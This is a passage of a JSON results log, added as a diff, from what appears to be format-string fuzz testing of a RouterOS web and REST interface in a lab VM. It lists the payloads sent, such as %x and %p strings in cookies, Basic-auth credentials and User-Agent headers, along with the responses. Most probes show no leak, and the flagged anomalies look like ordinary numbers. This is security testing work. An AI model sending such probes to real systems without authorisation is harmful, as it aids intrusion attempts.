+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:50:47 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        }
+      }
+    },
+    {
+      "id": 64,
+      "category": "cookie_format_string",
+      "name": "cookie_direct",
+      "description": "Direct param access in cookies",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:10:52.198130",
+      "details": {
+        "cookie_value": "session=AAAA%1$x; id=BBBB%2$x",
+        "description": "Direct param access in cookies",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "No format string processing indicators detected.",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:50:47 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "No format string processing indicators detected.",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        }
+      }
+    },
+    {
+      "id": 65,
+      "category": "basicauth_format_string",
+      "name": "basicauth_user_hex",
+      "description": "Format string in username",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:10:52.522292",
+      "details": {
+        "credential_string": "%x%x%x%x:password",
+        "base64_encoded": "JXgleCV4JXg6cGFzc3dvcmQ=",
+        "description": "Format string in username",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:50:48 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        }
+      }
+    },
+    {
+      "id": 66,
+      "category": "basicauth_format_string",
+      "name": "basicauth_pass_ptr",
+      "description": "Format string in password",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:10:52.838450",
+      "details": {
+        "credential_string": "admin:%p%p%p%p",
+        "base64_encoded": "YWRtaW46JXAlcCVwJXA=",
+        "description": "Format string in password",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:50:48 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        }
+      }
+    },
+    {
+      "id": 67,
+      "category": "basicauth_format_string",
+      "name": "basicauth_user_struct",
+      "description": "Structured leak in username",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:10:53.158610",
+      "details": {
+        "credential_string": "%08x.%08x.%08x:test",
+        "base64_encoded": "JTA4eC4lMDh4LiUwOHg6dGVzdA==",
+        "description": "Structured leak in username",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:50:48 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        }
+      }
+    },
+    {
+      "id": 68,
+      "category": "basicauth_format_string",
+      "name": "basicauth_both",
+      "description": "Format string in both user and pass",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:10:53.510786",
+      "details": {
+        "credential_string": "%x%x%x:%p%p%p",
+        "base64_encoded": "JXgleCV4OiVwJXAlcA==",
+        "description": "Format string in both user and pass",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:50:49 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        }
+      }
+    },
+    {
+      "id": 69,
+      "category": "preauth_postauth_comparison",
+      "name": "prepost_webfig_hex_no_auth",
+      "description": "/webfig/ User-Agent=%x%x%x%x%x%x%x%x (no_auth)",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:10:54.231146",
+      "details": {
+        "path": "/webfig/",
+        "header": "User-Agent",
+        "payload": "%x%x%x%x%x%x%x%x",
+        "auth_mode": "no_auth",
+        "response": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:50:49 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "behavior_differs_from_counterpart": false,
+        "comparison_summary": {
+          "no_auth_status": 200,
+          "with_auth_status": 200,
+          "no_auth_length": 22703,
+          "with_auth_length": 22703,
+          "no_auth_leaks": [],
+          "with_auth_leaks": []
+        }
+      }
+    },
+    {
+      "id": 70,
+      "category": "preauth_postauth_comparison",
+      "name": "prepost_webfig_hex_with_auth",
+      "description": "/webfig/ User-Agent=%x%x%x%x%x%x%x%x (with_auth)",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:10:54.231146",
+      "details": {
+        "path": "/webfig/",
+        "header": "User-Agent",
+        "payload": "%x%x%x%x%x%x%x%x",
+        "auth_mode": "with_auth",
+        "response": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:50:49 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "behavior_differs_from_counterpart": false,
+        "comparison_summary": {
+          "no_auth_status": 200,
+          "with_auth_status": 200,
+          "no_auth_length": 22703,
+          "with_auth_length": 22703,
+          "no_auth_leaks": [],
+          "with_auth_leaks": []
+        }
+      }
+    },
+    {
+      "id": 71,
+      "category": "preauth_postauth_comparison",
+      "name": "prepost_webfig_ptr_no_auth",
+      "description": "/webfig/ User-Agent=%p%p%p%p%p%p%p%p (no_auth)",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:10:54.651356",
+      "details": {
+        "path": "/webfig/",
+        "header": "User-Agent",
+        "payload": "%p%p%p%p%p%p%p%p",
+        "auth_mode": "no_auth",
+        "response": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:50:49 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "behavior_differs_from_counterpart": false,
+        "comparison_summary": {
+          "no_auth_status": 200,
+          "with_auth_status": 200,
+          "no_auth_length": 22703,
+          "with_auth_length": 22703,
+          "no_auth_leaks": [],
+          "with_auth_leaks": []
+        }
+      }
+    },
+    {
+      "id": 72,
+      "category": "preauth_postauth_comparison",
+      "name": "prepost_webfig_ptr_with_auth",
+      "description": "/webfig/ User-Agent=%p%p%p%p%p%p%p%p (with_auth)",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:10:54.651356",
+      "details": {
+        "path": "/webfig/",
+        "header": "User-Agent",
+        "payload": "%p%p%p%p%p%p%p%p",
+        "auth_mode": "with_auth",
+        "response": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:50:49 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "behavior_differs_from_counterpart": false,
+        "comparison_summary": {
+          "no_auth_status": 200,
+          "with_auth_status": 200,
+          "no_auth_length": 22703,
+          "with_auth_length": 22703,
+          "no_auth_leaks": [],
+          "with_auth_leaks": []
+        }
+      }
+    },
+    {
+      "id": 73,
+      "category": "preauth_postauth_comparison",
+      "name": "prepost_rest_hex_no_auth",
+      "description": "/rest/system/resource User-Agent=%x%x%x%x%x%x%x%x (no_auth)",
+      "result": "ANOMALY",
+      "anomaly": true,
+      "timestamp": "2026-02-16T14:10:55.059560",
+      "details": {
+        "path": "/rest/system/resource",
+        "header": "User-Agent",
+        "payload": "%x%x%x%x%x%x%x%x",
+        "auth_mode": "no_auth",
+        "response": {
+          "status_code": 401,
+          "response_length": 302,
+          "leaked_data": [
+            "31536000"
+          ],
+          "anomaly": true,
+          "details": "Format specifiers not reflected literally. Total 1 leak indicators found.",
+          "response_snippet": "HTTP/1.1 401 Unauthorized\r\nCache-Control: max-age=31536000\r\nConnection: close\r\nContent-Length: 38\r\nContent-Type: application/json\r\nDate: Mon, 16 Feb 2026 21:50:50 GMT\r\nExpires: Tue, 16 Feb 2027 21:50:50 GMT\r\nWWW-Authenticate: Basic\r\nX-Frame-Options: sameorigin\r\n\r\n{\"error\":401,\"message\":\"Unauthorized\"}"
+        },
+        "behavior_differs_from_counterpart": true,
+        "comparison_summary": {
+          "no_auth_status": 401,
+          "with_auth_status": 200,
+          "no_auth_length": 302,
+          "with_auth_length": 672,
+          "no_auth_leaks": [
+            "31536000"
+          ],
+          "with_auth_leaks": [
+            "31536000",
+            "73211904",
+            "93564928"
+          ]
+        }
+      }
+    },
+    {
+      "id": 74,
+      "category": "preauth_postauth_comparison",
+      "name": "prepost_rest_hex_with_auth",
+      "description": "/rest/system/resource User-Agent=%x%x%x%x%x%x%x%x (with_auth)",
+      "result": "ANOMALY",
+      "anomaly": true,
+      "timestamp": "2026-02-16T14:10:55.059560",
+      "details": {
+        "path": "/rest/system/resource",
+        "header": "User-Agent",
+        "payload": "%x%x%x%x%x%x%x%x",
+        "auth_mode": "with_auth",
+        "response": {
+          "status_code": 200,
+          "response_length": 672,
+          "leaked_data": [
+            "31536000",
+            "73211904",
+            "93564928"
+          ],
+          "anomaly": true,
+          "details": "Format specifiers not reflected literally. Total 3 leak indicators found.",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: max-age=31536000\r\nConnection: close\r\nContent-Length: 442\r\nContent-Type: application/json\r\nDate: Mon, 16 Feb 2026 21:50:50 GMT\r\nExpires: Tue, 16 Feb 2027 21:50:50 GMT\r\nX-Frame-Options: sameorigin\r\n\r\n{\"architecture-name\":\"x86_64\",\"board-name\":\"CHR innotek GmbH VirtualBox\",\"build-time\":\"2026-01-30 09:17:54\",\"cpu\":\"AMD\",\"cpu-count\":\"1\",\"cpu-frequency\":\"4391\",\"cpu-load\":\"3\",\"factory-software\":\"7.1\",\"free-hdd-space\":\"73211904\",\"free-memory\":\"837640192\",\"platform\":\"Mikro... [truncated, total 672 chars]"
+        },
+        "behavior_differs_from_counterpart": true,
+        "comparison_summary": {
+          "no_auth_status": 401,
+          "with_auth_status": 200,
+          "no_auth_length": 302,
+          "with_auth_length": 672,
+          "no_auth_leaks": [
+            "31536000"
+          ],
+          "with_auth_leaks": [
+            "31536000",
+            "73211904",
+            "93564928"
+          ]
+        }
+      }
+    },
+    {
+      "id": 75,
+      "category": "preauth_postauth_comparison",
+      "name": "prepost_rest_ptr_no_auth",
+      "description": "/rest/system/resource User-Agent=%p%p%p%p%p%p%p%p (no_auth)",
+      "result": "ANOMALY",
+      "anomaly": true,
+      "timestamp": "2026-02-16T14:10:55.511786",
+      "details": {
+        "path": "/rest/system/resource",
+        "header": "User-Agent",
+        "payload": "%p%p%p%p%p%p%p%p",
+        "auth_mode": "no_auth",
+        "response": {
+          "status_code": 401,
+          "response_length": 302,
+          "leaked_data": [
+            "31536000"
+          ],
+          "anomaly": true,
+          "details": "Format specifiers not reflected literally. Total 1 leak indicators found.",
+          "response_snippet": "HTTP/1.1 401 Unauthorized\r\nCache-Control: max-age=31536000\r\nConnection: close\r\nContent-Length: 38\r\nContent-Type: application/json\r\nDate: Mon, 16 Feb 2026 21:50:50 GMT\r\nExpires: Tue, 16 Feb 2027 21:50:50 GMT\r\nWWW-Authenticate: Basic\r\nX-Frame-Options: sameorigin\r\n\r\n{\"error\":401,\"message\":\"Unauthorized\"}"
+        },
+        "behavior_differs_from_counterpart": true,
+        "comparison_summary": {
+          "no_auth_status": 401,
+          "with_auth_status": 200,
+          "no_auth_length": 302,
+          "with_auth_length": 672,
+          "no_auth_leaks": [
+            "31536000"
+          ],
+          "with_auth_leaks": [
+            "31536000",
+            "73211904",
+            "93564928"
+          ]
+        }
+      }
+    },
+    {
+      "id": 76,
+      "category": "preauth_postauth_comparison",
+      "name": "prepost_rest_ptr_with_auth",
+      "description": "/rest/system/resource User-Agent=%p%p%p%p%p%p%p%p (with_auth)",
+      "result": "ANOMALY",
+      "anomaly": true,
+      "timestamp": "2026-02-16T14:10:55.511786",
+      "details": {
+        "path": "/rest/system/resource",
+        "header": "User-Agent",
+        "payload": "%p%p%p%p%p%p%p%p",
+        "auth_mode": "with_auth",
+        "response": {
+          "status_code": 200,
+          "response_length": 672,
+          "leaked_data": [
+            "31536000",
+            "73211904",
+            "93564928"
+          ],
+          "anomaly": true,
+          "details": "Format specifiers not reflected literally. Total 3 leak indicators found.",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: max-age=31536000\r\nConnection: close\r\nContent-Length: 442\r\nContent-Type: application/json\r\nDate: Mon, 16 Feb 2026 21:50:50 GMT\r\nExpires: Tue, 16 Feb 2027 21:50:50 GMT\r\nX-Frame-Options: sameorigin\r\n\r\n{\"architecture-name\":\"x86_64\",\"board-name\":\"CHR innotek GmbH VirtualBox\",\"build-time\":\"2026-01-30 09:17:54\",\"cpu\":\"AMD\",\"cpu-count\":\"1\",\"cpu-frequency\":\"4391\",\"cpu-load\":\"3\",\"factory-software\":\"7.1\",\"free-hdd-space\":\"73211904\",\"free-memory\":\"837607424\",\"platform\":\"Mikro... [truncated, total 672 chars]"
+        },
+        "behavior_differs_from_counterpart": true,
+        "comparison_summary": {
+          "no_auth_status": 401,
+          "with_auth_status": 200,
+          "no_auth_length": 302,
+          "with_auth_length": 672,
+          "no_auth_leaks": [
+            "31536000"
+          ],
+          "with_auth_leaks": [
+            "31536000",
+            "73211904",
+            "93564928"
+          ]
+        }
+      }
+    }
+  ],
+  "findings": []
+}
